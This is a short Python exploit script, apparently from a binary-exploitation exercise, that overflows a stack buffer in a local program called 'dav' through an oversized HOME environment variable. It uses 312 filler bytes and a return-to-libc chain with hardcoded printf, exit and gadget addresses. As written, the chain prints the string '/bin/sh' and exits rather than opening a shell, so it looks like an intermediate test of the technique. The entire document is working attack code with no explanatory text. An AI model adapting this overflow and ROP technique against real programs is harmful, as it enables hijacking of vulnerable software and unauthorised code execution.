#!/usr/bin/python
from struct import *
import os


libc_binsh = pack("<I", 0xf7ef7aaa)
libc_printf = pack("<I", 0xf7dcb860)
libc_exit = pack("<I", 0xf7daaa60)
libc_popret = pack("<I", 0xf7e76671)
ret = pack("<I", 0x804900a)
rop_popret = pack("<I", 0x804901e)

buffer = ''
buffer += "A" * 312


# printf("/bin/sh")
buffer += libc_printf
buffer += libc_popret
buffer += pack("<I", 0x80488b9) #libc_binsh

# exit()
buffer += libc_exit
buffer += ret


PROGNAME = "./dav"
os.environ['HOME'] = buffer
os.execve(PROGNAME, [PROGNAME], os.environ)
